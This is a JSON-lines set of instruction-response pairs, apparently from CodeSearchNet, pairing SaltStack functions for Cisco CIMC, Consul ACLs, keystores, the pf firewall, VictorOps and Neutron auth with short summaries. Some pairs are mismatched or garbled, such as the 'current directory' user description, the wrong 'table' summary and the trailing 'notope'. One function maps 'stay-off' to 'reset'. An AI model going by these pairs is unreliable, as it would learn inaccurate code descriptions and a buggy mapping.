{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef set_logging_levels(remote=None, local=None):\n    '''\n    Sets the logging levels of the CIMC devices. The logging levels must match\n    the following options: emergency, alert, critical, error, warning, notice,\n    informational, debug.\n\n    .. versionadded:: 2019.2.0\n\n    Args:\n        remote(str): The logging level for SYSLOG logs.\n\n        local(str): The logging level for the local device.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_logging_levels remote=error local=notice\n\n    '''\n\n    logging_options = ['emergency',\n                       'alert',\n                       'critical',\n                       'error',\n                       'warning',\n                       'notice',\n                       'informational',\n                       'debug']\n\n    query = \"\"\n\n    if remote:\n        if remote in logging_options:\n            query += ' remoteSeverity=\"{0}\"'.format(remote)\n        else:\n            raise salt.exceptions.CommandExecutionError(\"Remote Severity option is not valid.\")\n\n    if local:\n        if local in logging_options:\n            query += ' localSeverity=\"{0}\"'.format(local)\n        else:\n            raise salt.exceptions.CommandExecutionError(\"Local Severity option is not valid.\")\n\n    dn = \"sys/svc-ext/syslog\"\n    inconfig = \"\"\"<commSyslog dn=\"sys/svc-ext/syslog\"{0} ></commSyslog>\"\"\".format(query)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret", "response": "Sets the logging levels for the remote and local devices."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_ntp_server(server1='', server2='', server3='', server4=''):\n    '''\n    Sets the NTP servers configuration. This will also enable the client NTP service.\n\n    Args:\n        server1(str): The first IP address or FQDN of the NTP servers.\n\n        server2(str): The second IP address or FQDN of the NTP servers.\n\n        server3(str): The third IP address or FQDN of the NTP servers.\n\n        server4(str): The fourth IP address or FQDN of the NTP servers.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_ntp_server 10.10.10.1\n\n        salt '*' cimc.set_ntp_server 10.10.10.1 foo.bar.com\n\n    '''\n\n    dn = \"sys/svc-ext/ntp-svc\"\n    inconfig = \"\"\"<commNtpProvider dn=\"sys/svc-ext/ntp-svc\" ntpEnable=\"yes\" ntpServer1=\"{0}\" ntpServer2=\"{1}\"\n    ntpServer3=\"{2}\" ntpServer4=\"{3}\"/>\"\"\".format(server1, server2, server3, server4)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret", "response": "Sets the NTP servers configuration."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef set_power_configuration(policy=None, delayType=None, delayValue=None):\n    '''\n    Sets the power configuration on the device. This is only available for some\n    C-Series servers.\n\n    .. versionadded:: 2019.2.0\n\n    Args:\n        policy(str): The action to be taken when chassis power is restored after\n        an unexpected power loss. This can be one of the following:\n\n            reset: The server is allowed to boot up normally when power is\n            restored. The server can restart immediately or, optionally, after a\n            fixed or random delay.\n\n            stay-off: The server remains off until it is manually restarted.\n\n            last-state: The server restarts and the system attempts to restore\n            any processes that were running before power was lost.\n\n        delayType(str): If the selected policy is reset, the restart can be\n        delayed with this option. This can be one of the following:\n\n            fixed: The server restarts after a fixed delay.\n\n            random: The server restarts after a random delay.\n\n        delayValue(int): If a fixed delay is selected, once chassis power is\n        restored and the Cisco IMC has finished rebooting, the system waits for\n        the specified number of seconds before restarting the server. Enter an\n        integer between 0 and 240.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_power_configuration stay-off\n\n        salt '*' cimc.set_power_configuration reset fixed 0\n\n    '''\n\n    query = \"\"\n    if policy == \"reset\":\n        query = ' vpResumeOnACPowerLoss=\"reset\"'\n        if delayType:\n            if delayType == \"fixed\":\n                query += ' delayType=\"fixed\"'\n                if delayValue:\n                    query += ' delay=\"{0}\"'.format(delayValue)\n            elif delayType == \"random\":\n                query += ' delayType=\"random\"'\n            else:\n                raise salt.exceptions.CommandExecutionError(\"Invalid delay type entered.\")\n    elif policy == \"stay-off\":\n        query = ' vpResumeOnACPowerLoss=\"reset\"'\n    elif policy == \"last-state\":\n        query = ' vpResumeOnACPowerLoss=\"last-state\"'\n    else:\n        raise salt.exceptions.CommandExecutionError(\"The power state must be specified.\")\n\n    dn = \"sys/rack-unit-1/board/Resume-on-AC-power-loss\"\n    inconfig = \"\"\"<biosVfResumeOnACPowerLoss\n    dn=\"sys/rack-unit-1/board/Resume-on-AC-power-loss\"{0}>\n    </biosVfResumeOnACPowerLoss>\"\"\".format(query)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret", "response": "Sets the power configuration on the specified chassis."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting the SYSLOG server on the host.", "response": "def set_syslog_server(server=None, type=\"primary\"):\n    '''\n    Set the SYSLOG server on the host.\n\n    Args:\n        server(str): The hostname or IP address of the SYSLOG server.\n\n        type(str): Specifies the type of SYSLOG server. This can either be primary (default) or secondary.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_syslog_server foo.bar.com\n\n        salt '*' cimc.set_syslog_server foo.bar.com primary\n\n        salt '*' cimc.set_syslog_server foo.bar.com secondary\n\n    '''\n\n    if not server:\n        raise salt.exceptions.CommandExecutionError(\"The SYSLOG server must be specified.\")\n\n    if type == \"primary\":\n        dn = \"sys/svc-ext/syslog/client-primary\"\n        inconfig = \"\"\"<commSyslogClient name='primary' adminState='enabled'  hostname='{0}'\n        dn='sys/svc-ext/syslog/client-primary'> </commSyslogClient>\"\"\".format(server)\n    elif type == \"secondary\":\n        dn = \"sys/svc-ext/syslog/client-secondary\"\n        inconfig = \"\"\"<commSyslogClient name='secondary' adminState='enabled'  hostname='{0}'\n        dn='sys/svc-ext/syslog/client-secondary'> </commSyslogClient>\"\"\".format(server)\n    else:\n        raise salt.exceptions.CommandExecutionError(\"The SYSLOG type must be either primary or secondary.\")\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting a user in the current directory.", "response": "def set_user(uid=None, username=None, password=None, priv=None, status=None):\n    '''\n    Sets a CIMC user with specified configurations.\n\n    .. versionadded:: 2019.2.0\n\n    Args:\n        uid(int): The user ID slot to create the user account in.\n\n        username(str): The name of the user.\n\n        password(str): The clear text password of the user.\n\n        priv(str): The privilege level of the user.\n\n        status(str): The account status of the user.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.set_user 11 username=admin password=foobar priv=admin active\n\n    '''\n\n    conf = \"\"\n    if not uid:\n        raise salt.exceptions.CommandExecutionError(\"The user ID must be specified.\")\n\n    if status:\n        conf += ' accountStatus=\"{0}\"'.format(status)\n\n    if username:\n        conf += ' name=\"{0}\"'.format(username)\n\n    if priv:\n        conf += ' priv=\"{0}\"'.format(priv)\n\n    if password:\n        conf += ' pwd=\"{0}\"'.format(password)\n\n    dn = \"sys/user-ext/user-{0}\".format(uid)\n\n    inconfig = \"\"\"<aaaUser id=\"{0}\"{1} dn=\"sys/user-ext/user-{0}\"/>\"\"\".format(uid,\n                                                                               conf)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef tftp_update_bios(server=None, path=None):\n    '''\n    Update the BIOS firmware through TFTP.\n\n    Args:\n        server(str): The IP address or hostname of the TFTP server.\n\n        path(str): The TFTP path and filename for the BIOS image.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' cimc.tftp_update_bios foo.bar.com HP-SL2.cap\n\n    '''\n\n    if not server:\n        raise salt.exceptions.CommandExecutionError(\"The server name must be specified.\")\n\n    if not path:\n        raise salt.exceptions.CommandExecutionError(\"The TFTP path must be specified.\")\n\n    dn = \"sys/rack-unit-1/bios/fw-updatable\"\n\n    inconfig = \"\"\"<firmwareUpdatable adminState='trigger' dn='sys/rack-unit-1/bios/fw-updatable'\n    protocol='tftp' remoteServer='{0}' remotePath='{1}'\n    type='blade-bios' />\"\"\".format(server, path)\n\n    ret = __proxy__['cimc.set_config_modify'](dn, inconfig, False)\n\n    return ret", "response": "Update the BIOS firmware through TFTP."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns True if the acl need to be updated False otherwise", "response": "def _acl_changes(name, id=None, type=None, rules=None, consul_url=None, token=None):\n    '''\n       return True if the acl need to be update, False if it doesn't need to be update\n    '''\n    info = __salt__['consul.acl_info'](id=id, token=token, consul_url=consul_url)\n\n    if info['res'] and info['data'][0]['Name'] != name:\n        return True\n    elif info['res'] and info['data'][0]['Rules'] != rules:\n        return True\n    elif info['res'] and info['data'][0]['Type'] != type:\n        return True\n    else:\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _acl_exists(name=None, id=None, token=None, consul_url=None):\n    '''\n       Check the acl exists by using the name or the ID,\n       name is ignored if ID is specified,\n       if only Name is used the ID associated with it is returned\n    '''\n\n    ret = {'result': False, 'id': None}\n\n    if id:\n        info = __salt__['consul.acl_info'](id=id, token=token, consul_url=consul_url)\n    elif name:\n        info = __salt__['consul.acl_list'](token=token, consul_url=consul_url)\n    else:\n        return ret\n\n    if info.get('data'):\n        for acl in info['data']:\n            if id and acl['ID'] == id:\n                ret['result'] = True\n                ret['id'] = id\n            elif name and acl['Name'] == name:\n                ret['result'] = True\n                ret['id'] = acl['ID']\n\n    return ret", "response": "Check the acl exists by using the name or the ID"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef acl_present(name, id=None, token=None, type=\"client\", rules=\"\", consul_url='http://localhost:8500'):\n    '''\n    Ensure the ACL is present\n\n    name\n        Specifies a human-friendly name for the ACL token.\n\n    id\n        Specifies the ID of the ACL.\n\n    type: client\n        Specifies the type of ACL token. Valid values are: client and management.\n\n    rules\n        Specifies rules for this ACL token.\n\n    consul_url : http://locahost:8500\n        consul URL to query\n\n    .. note::\n        For more information https://www.consul.io/api/acl.html#create-acl-token, https://www.consul.io/api/acl.html#update-acl-token\n    '''\n\n    ret = {\n            'name': name,\n            'changes': {},\n            'result': True,\n            'comment': 'ACL \"{0}\" exists and is up to date'.format(name)}\n\n    exists = _acl_exists(name, id, token, consul_url)\n\n    if not exists['result']:\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = \"the acl doesn't exist, it will be created\"\n            return ret\n\n        create = __salt__['consul.acl_create'](name=name, id=id, token=token, type=type, rules=rules, consul_url=consul_url)\n        if create['res']:\n            ret['result'] = True\n            ret['comment'] = \"the acl has been created\"\n        elif not create['res']:\n            ret['result'] = False\n            ret['comment'] = \"failed to create the acl\"\n    elif exists['result']:\n        changes = _acl_changes(name=name, id=exists['id'], token=token, type=type, rules=rules, consul_url=consul_url)\n        if changes:\n            if __opts__['test']:\n                ret['result'] = None\n                ret['comment'] = \"the acl exists and will be updated\"\n                return ret\n\n            update = __salt__['consul.acl_update'](name=name, id=exists['id'], token=token, type=type, rules=rules, consul_url=consul_url)\n            if update['res']:\n                ret['result'] = True\n                ret['comment'] = \"the acl has been updated\"\n            elif not update['res']:\n                ret['result'] = False\n                ret['comment'] = \"failed to update the acl\"\n\n    return ret", "response": "Ensure the ACL is present and is up to date."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nensuring the ACL is absent", "response": "def acl_absent(name, id=None, token=None, consul_url='http://localhost:8500'):\n    '''\n    Ensure the ACL is absent\n\n    name\n        Specifies a human-friendly name for the ACL token.\n\n    id\n        Specifies the ID of the ACL.\n\n    token\n        token to authenticate you Consul query\n\n    consul_url : http://locahost:8500\n        consul URL to query\n\n    .. note::\n        For more information https://www.consul.io/api/acl.html#delete-acl-token\n\n    '''\n    ret = {\n            'name': id,\n            'changes': {},\n            'result': True,\n            'comment': 'ACL \"{0}\" does not exist'.format(id)}\n\n    exists = _acl_exists(name, id, token, consul_url)\n    if exists['result']:\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = \"the acl exists, it will be deleted\"\n            return ret\n\n        delete = __salt__['consul.acl_delete'](id=exists['id'], token=token, consul_url=consul_url)\n        if delete['res']:\n            ret['result'] = True\n            ret['comment'] = \"the acl has been deleted\"\n        elif not delete['res']:\n            ret['result'] = False\n            ret['comment'] = \"failed to delete the acl\"\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _linux_nqn():\n    '''\n    Return NVMe NQN from a Linux host.\n    '''\n    ret = []\n\n    initiator = '/etc/nvme/hostnqn'\n    try:\n        with salt.utils.files.fopen(initiator, 'r') as _nvme:\n            for line in _nvme:\n                line = line.strip()\n                if line.startswith('nqn.'):\n                    ret.append(line)\n    except IOError as ex:\n        if ex.errno != errno.ENOENT:\n            log.debug(\"Error while accessing '%s': %s\", initiator, ex)\n\n    return ret", "response": "Return NVMe NQN from a Linux host."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate or manage a java keystore. name The path to the keystore file passphrase The password to the keystore entries A list containing an alias, certificate, and optional private_key. The certificate and private_key can be a file or a string .. code-block:: yaml - entries: - alias: hostname2 certificate: /path/to/cert.crt private_key: /path/to/key.key - alias: stringhost certificate: | -----BEGIN CERTIFICATE----- MIICEjCCAXsCAg36MA0GCSqGSIb3DQEBBQUAMIGbMQswCQYDVQQGEwJKUDEOMAwG ... 2VguKv4SWjRFoRkIfIlHX0qVviMhSlNy2ioFLy7JcPZb+v3ftDGywUqcBiVDoea0 -----END CERTIFICATE----- force_remove If True will cause the state to remove any entries found in the keystore which are not defined in the state. The default is False. Example .. code-block:: yaml define_keystore: keystore.managed: - name: /path/to/keystore - passphrase: changeit - force_remove: True - entries: - alias: hostname1 certificate: /path/to/cert.crt - alias: remotehost certificate: /path/to/cert2.crt private_key: /path/to/key2.key - alias: pillarhost certificate: {{ salt.pillar.get('path:to:cert') }}", "response": "def managed(name, passphrase, entries, force_remove=False):\n    '''\n    Create or manage a java keystore.\n\n    name\n        The path to the keystore file\n\n    passphrase\n        The password to the keystore\n\n    entries\n        A list containing an alias, certificate, and optional private_key.\n        The certificate and private_key can be a file or a string\n\n        .. code-block:: yaml\n\n            - entries:\n              - alias: hostname2\n                certificate: /path/to/cert.crt\n                private_key: /path/to/key.key\n              - alias: stringhost\n                certificate: |\n                  -----BEGIN CERTIFICATE-----\n                  MIICEjCCAXsCAg36MA0GCSqGSIb3DQEBBQUAMIGbMQswCQYDVQQGEwJKUDEOMAwG\n                  ...\n                  2VguKv4SWjRFoRkIfIlHX0qVviMhSlNy2ioFLy7JcPZb+v3ftDGywUqcBiVDoea0\n                  -----END CERTIFICATE-----\n\n    force_remove\n        If True will cause the state to remove any entries found in the keystore which are not\n        defined in the state. The default is False.\n\n    Example\n\n    .. code-block:: yaml\n\n        define_keystore:\n          keystore.managed:\n            - name: /path/to/keystore\n            - passphrase: changeit\n            - force_remove: True\n            - entries:\n              - alias: hostname1\n                certificate: /path/to/cert.crt\n              - alias: remotehost\n                certificate: /path/to/cert2.crt\n                private_key: /path/to/key2.key\n              - alias: pillarhost\n                certificate: {{ salt.pillar.get('path:to:cert') }}\n    '''\n    ret = {'changes': {},\n        'comment': '',\n        'name': name,\n        'result': True}\n\n    keep_list = []\n    old_aliases = []\n\n    if force_remove:\n        if os.path.exists(name):\n            existing_entries = __salt__['keystore.list'](name, passphrase)\n            for entry in existing_entries:\n                old_aliases.append(entry.get('alias'))\n            log.debug(\"Existing aliases list: %s\", old_aliases)\n\n    for entry in entries:\n        update_entry = True\n        existing_entry = None\n        if os.path.exists(name):\n            if force_remove:\n                keep_list.append(entry['alias'])\n\n            existing_entry = __salt__['keystore.list'](name, passphrase, entry['alias'])\n            if existing_entry:\n                existing_sha1 = existing_entry[0]['sha1']\n                new_sha1 = __salt__['x509.read_certificate'](entry['certificate'])['SHA1 Finger Print']\n                if existing_sha1 == new_sha1:\n                    update_entry = False\n\n        if update_entry:\n            if __opts__['test']:\n                ret['result'] = None\n                if existing_entry:\n                    ret['comment'] += \"Alias {0} would have been updated\\n\".format(entry['alias'])\n                else:\n                    ret['comment'] += \"Alias {0} would have been added\\n\".format(entry['alias'])\n            else:\n                if existing_entry:\n                    result = __salt__['keystore.remove'](entry['alias'], name, passphrase)\n                    result = __salt__['keystore.add'](entry['alias'],\n                                                    name,\n                                                    passphrase,\n                                                    entry['certificate'],\n                                                    private_key=entry.get('private_key', None)\n                                                    )\n                    if result:\n                        ret['changes'][entry['alias']] = \"Updated\"\n                        ret['comment'] += \"Alias {0} updated.\\n\".format(entry['alias'])\n                else:\n                    result = __salt__['keystore.add'](entry['alias'],\n                                                    name,\n                                                    passphrase,\n                                                    entry['certificate'],\n                                                    private_key=entry.get('private_key', None)\n                                                    )\n                    if result:\n                        ret['changes'][entry['alias']] = \"Added\"\n                        ret['comment'] += \"Alias {0} added.\\n\".format(entry['alias'])\n\n    if force_remove:\n        # Determine which aliases need to be removed\n        remove_list = list(set(old_aliases) - set(keep_list))\n        log.debug(\"Will remove: %s\", remove_list)\n        for alias_name in remove_list:\n            if __opts__['test']:\n                ret['comment'] += \"Alias {0} would have been removed\".format(alias_name)\n                ret['result'] = None\n            else:\n                __salt__['keystore.remove'](alias_name, name, passphrase)\n                ret['changes'][alias_name] = \"Removed\"\n                ret['comment'] += \"Alias {0} removed.\\n\".format(alias_name)\n\n    if not ret['changes'] and not ret['comment']:\n        ret['comment'] = \"No changes made.\\n\"\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef disable():\n    '''\n    Disable the Packet Filter.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.disable\n    '''\n    ret = {}\n    result = __salt__['cmd.run_all']('pfctl -d',\n                                     output_loglevel='trace',\n                                     python_shell=False)\n\n    if result['retcode'] == 0:\n        ret = {'comment': 'pf disabled', 'changes': True}\n    else:\n        # If pf was already disabled the return code is also non-zero.\n        # Don't raise an exception in that case.\n        if result['stderr'] == 'pfctl: pf not enabled':\n            ret = {'comment': 'pf already disabled', 'changes': False}\n        else:\n            raise CommandExecutionError(\n                'Could not disable pf',\n                info={'errors': [result['stderr']], 'changes': False}\n            )\n\n    return ret", "response": "Disable the Packet Filter."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef loglevel(level):\n    '''\n    Set the debug level which limits the severity of log messages printed by ``pf(4)``.\n\n    level:\n        Log level. Should be one of the following: emerg, alert, crit, err, warning, notice,\n        info or debug (OpenBSD); or none, urgent, misc, loud (FreeBSD).\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.loglevel emerg\n    '''\n    # There's no way to getting the previous loglevel so imply we've\n    # always made a change.\n    ret = {'changes': True}\n\n    myos = __grains__['os']\n    if myos == 'FreeBSD':\n        all_levels = ['none', 'urgent', 'misc', 'loud']\n    else:\n        all_levels = ['emerg', 'alert', 'crit', 'err', 'warning', 'notice', 'info', 'debug']\n    if level not in all_levels:\n        raise SaltInvocationError('Unknown loglevel: {0}'.format(level))\n\n    result = __salt__['cmd.run_all']('pfctl -x {0}'.format(level),\n                                     output_loglevel='trace',\n                                     python_shell=False)\n\n    if result['retcode'] != 0:\n        raise CommandExecutionError(\n            'Problem encountered setting loglevel',\n            info={'errors': [result['stderr']], 'changes': False}\n        )\n\n    return ret", "response": "Set the debug level which limits the severity of log messages printed by pf ( 4 )."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load(file='/etc/pf.conf', noop=False):\n    '''\n    Load a ruleset from the specific file, overwriting the currently loaded ruleset.\n\n    file:\n        Full path to the file containing the ruleset.\n\n    noop:\n        Don't actually load the rules, just parse them.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.load /etc/pf.conf.d/lockdown.conf\n    '''\n    # We cannot precisely determine if loading the ruleset implied\n    # any changes so assume it always does.\n    ret = {'changes': True}\n    cmd = ['pfctl', '-f', file]\n\n    if noop:\n        ret['changes'] = False\n        cmd.append('-n')\n\n    result = __salt__['cmd.run_all'](cmd,\n                                     output_loglevel='trace',\n                                     python_shell=False)\n\n    if result['retcode'] != 0:\n        raise CommandExecutionError(\n            'Problem loading the ruleset from {0}'.format(file),\n            info={'errors': [result['stderr']], 'changes': False}\n        )\n\n    return ret", "response": "Load a specific ruleset from the specific file overwriting the currently loaded ruleset."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef flush(modifier):\n    '''\n    Flush the specified packet filter parameters.\n\n    modifier:\n        Should be one of the following:\n\n        - all\n        - info\n        - osfp\n        - rules\n        - sources\n        - states\n        - tables\n\n        Please refer to the OpenBSD `pfctl(8) <https://man.openbsd.org/pfctl#T>`_\n        documentation for a detailed explanation of each command.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.flush states\n    '''\n    ret = {}\n\n    all_modifiers = ['rules', 'states', 'info', 'osfp', 'all', 'sources', 'tables']\n\n    # Accept the following two modifiers to allow for a consistent interface between\n    # pfctl(8) and Salt.\n    capital_modifiers = ['Sources', 'Tables']\n    all_modifiers += capital_modifiers\n    if modifier.title() in capital_modifiers:\n        modifier = modifier.title()\n\n    if modifier not in all_modifiers:\n        raise SaltInvocationError('Unknown modifier: {0}'.format(modifier))\n\n    cmd = 'pfctl -v -F {0}'.format(modifier)\n    result = __salt__['cmd.run_all'](cmd,\n                                     output_loglevel='trace',\n                                     python_shell=False)\n\n    if result['retcode'] == 0:\n        if re.match(r'^0.*', result['stderr']):\n            ret['changes'] = False\n        else:\n            ret['changes'] = True\n\n        ret['comment'] = result['stderr']\n    else:\n        raise CommandExecutionError(\n            'Could not flush {0}'.format(modifier),\n            info={'errors': [result['stderr']], 'changes': False}\n        )\n\n    return ret", "response": "Flush the specified packet filter parameters."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a list of commands that can be applied to a table.", "response": "def table(command, table, **kwargs):\n    '''\n    Apply a command on the specified table.\n\n    table:\n        Name of the table.\n\n    command:\n        Command to apply to the table. Supported commands are:\n\n        - add\n        - delete\n        - expire\n        - flush\n        - kill\n        - replace\n        - show\n        - test\n        - zero\n\n        Please refer to the OpenBSD `pfctl(8) <https://man.openbsd.org/pfctl#T>`_\n        documentation for a detailed explanation of each command.\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.table expire table=spam_hosts number=300\n        salt '*' pf.table add table=local_hosts addresses='[\"127.0.0.1\", \"::1\"]'\n    '''\n    ret = {}\n\n    all_commands = ['kill', 'flush', 'add', 'delete', 'expire', 'replace', 'show', 'test', 'zero']\n    if command not in all_commands:\n        raise SaltInvocationError('Unknown table command: {0}'.format(command))\n\n    cmd = ['pfctl', '-t', table, '-T', command]\n\n    if command in ['add', 'delete', 'replace', 'test']:\n        cmd += kwargs.get('addresses', [])\n    elif command == 'expire':\n        number = kwargs.get('number', None)\n        if not number:\n            raise SaltInvocationError('need expire_number argument for expire command')\n        else:\n            cmd.append(number)\n\n    result = __salt__['cmd.run_all'](cmd,\n                                     output_level='trace',\n                                     python_shell=False)\n\n    if result['retcode'] == 0:\n        if command == 'show':\n            ret = {'comment': result['stdout'].split()}\n        elif command == 'test':\n            ret = {'comment': result['stderr'], 'matches': True}\n        else:\n            if re.match(r'^(0.*|no changes)', result['stderr']):\n                ret['changes'] = False\n            else:\n                ret['changes'] = True\n\n            ret['comment'] = result['stderr']\n    else:\n        # 'test' returns a non-zero code if the address didn't match, even if\n        # the command itself ran fine; also set 'matches' to False since not\n        # everything matched.\n        if command == 'test' and re.match(r'^\\d+/\\d+ addresses match.$', result['stderr']):\n            ret = {'comment': result['stderr'], 'matches': False}\n        else:\n            raise CommandExecutionError(\n                'Could not apply {0} on table {1}'.format(command, table),\n                info={'errors': [result['stderr']], 'changes': False}\n            )\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nshow filter parameters. modifier: Modifier to apply for filtering. Only a useful subset of what pfctl supports can be used with Salt. - rules - states - tables CLI example: .. code-block:: bash salt '*' pf.show rules", "response": "def show(modifier):\n    '''\n    Show filter parameters.\n\n    modifier:\n        Modifier to apply for filtering. Only a useful subset of what pfctl supports\n        can be used with Salt.\n\n        - rules\n        - states\n        - tables\n\n    CLI example:\n\n    .. code-block:: bash\n\n        salt '*' pf.show rules\n    '''\n    # By definition showing the parameters makes no changes.\n    ret = {'changes': False}\n\n    capital_modifiers = ['Tables']\n    all_modifiers = ['rules', 'states', 'tables']\n    all_modifiers += capital_modifiers\n    if modifier.title() in capital_modifiers:\n        modifier = modifier.title()\n\n    if modifier not in all_modifiers:\n        raise SaltInvocationError('Unknown modifier: {0}'.format(modifier))\n\n    cmd = 'pfctl -s {0}'.format(modifier)\n    result = __salt__['cmd.run_all'](cmd,\n                                     output_loglevel='trace',\n                                     python_shell=False)\n\n    if result['retcode'] == 0:\n        ret['comment'] = result['stdout'].split('\\n')\n    else:\n        raise CommandExecutionError(\n            'Could not show {0}'.format(modifier),\n            info={'errors': [result['stderr']], 'changes': False}\n        )\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_event(name, message_type, routing_key='everyone', **kwargs):\n    '''\n    Create an event on the VictorOps service\n\n    .. code-block:: yaml\n\n        webserver-warning-message:\n          victorops.create_event:\n            - message_type: 'CRITICAL'\n            - entity_id: 'webserver/diskspace'\n            - state_message: 'Webserver diskspace is low.'\n\n        database-server-warning-message:\n          victorops.create_event:\n            - message_type: 'WARNING'\n            - entity_id: 'db_server/load'\n            - state_message: 'Database Server load is high.'\n            - entity_is_host: True\n            - entity_display_name: 'dbdserver.example.com'\n\n    The following parameters are required:\n\n    name\n        This is a short description of the event.\n\n    message_type\n        One of the following values: INFO, WARNING, ACKNOWLEDGEMENT, CRITICAL, RECOVERY.\n\n    The following parameters are optional:\n\n        routing_key\n            The key for where messages should be routed. By default, sent to 'everyone' route.\n\n        entity_id\n            The name of alerting entity. If not provided, a random name will be assigned.\n\n        timestamp\n            Timestamp of the alert in seconds since epoch. Defaults to the time the alert is received at VictorOps.\n\n        timestamp_fmt\n            The date format for the timestamp parameter.  Defaults to ''%Y-%m-%dT%H:%M:%S'.\n\n        state_start_time\n            The time this entity entered its current state (seconds since epoch). Defaults to the time alert is received.\n\n        state_start_time_fmt\n            The date format for the timestamp parameter. Defaults to '%Y-%m-%dT%H:%M:%S'.\n\n        state_message\n            Any additional status information from the alert item.\n\n        entity_is_host\n            Used within VictorOps to select the appropriate display format for the incident.\n\n        entity_display_name\n            Used within VictorOps to display a human-readable name for the entity.\n\n        ack_message\n            A user entered comment for the acknowledgment.\n\n        ack_author\n            The user that acknowledged the incident.\n\n    '''\n    ret = {'name': name,\n           'changes': {},\n           'result': None,\n           'comment': ''}\n\n    if __opts__['test']:\n        ret['comment'] = 'Need to create event: {0}'.format(name)\n        return ret\n\n    res = __salt__['victorops.create_event'](\n        message_type=message_type,\n        routing_key=routing_key,\n        **kwargs\n    )\n    if res['result'] == 'success':\n        ret['result'] = True\n        ret['comment'] = 'Created event: {0} for entity {1}'.format(name, res['entity_id'])\n    else:\n        ret['result'] = False\n        ret['comment'] = 'Failed to create event: {0}'.format(res['message'])\n    return ret", "response": "Creates an event on the VictorOps service."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _auth(profile=None):\n    '''\n    Set up neutron credentials\n    '''\n    if profile:\n        credentials = __salt__['config.option'](profile)\n        user = credentials['keystone.user']\n        password = credentials['keystone.password']\n        tenant = credentials['keystone.tenant']\n        auth_url = credentials['keystone.auth_url']\n        region_name = credentials.get('keystone.region_name', None)\n        service_type = credentials.get('keystone.service_type', 'network')\n        os_auth_system = credentials.get('keystone.os_auth_system', None)\n        use_keystoneauth = credentials.get('keystone.use_keystoneauth', False)\n        verify = credentials.get('keystone.verify', True)\n    else:\n        user = __salt__['config.option']('keystone.user')\n        password = __salt__['config.option']('keystone.password')\n        tenant = __salt__['config.option']('keystone.tenant')\n        auth_url = __salt__['config.option']('keystone.auth_url')\n        region_name = __salt__['config.option']('keystone.region_name')\n        service_type = __salt__['config.option']('keystone.service_type')\n        os_auth_system = __salt__['config.option']('keystone.os_auth_system')\n        use_keystoneauth = __salt__['config.option']('keystone.use_keystoneauth')\n        verify = __salt__['config.option']('keystone.verify')\n\n    if use_keystoneauth is True:\n        project_domain_name = credentials['keystone.project_domain_name']\n        user_domain_name = credentials['keystone.user_domain_name']\n\n        kwargs = {\n            'username': user,\n            'password': password,\n            'tenant_name': tenant,\n            'auth_url': auth_url,\n            'region_name': region_name,\n            'service_type': service_type,\n            'os_auth_plugin': os_auth_system,\n            'use_keystoneauth': use_keystoneauth,\n            'verify': verify,\n            'project_domain_name': project_domain_name,\n            'user_domain_name': user_domain_name\n        }\n    else:\n        kwargs = {\n            'username': user,\n            'password': password,\n            'tenant_name': tenant,\n            'auth_url': auth_url,\n            'region_name': region_name,\n            'service_type': service_type,\n            'os_auth_plugin': os_auth_system\n        }\n\n    return suoneu.SaltNeutron(**kwargs)", "response": "Set up neutron credentials\notope"}
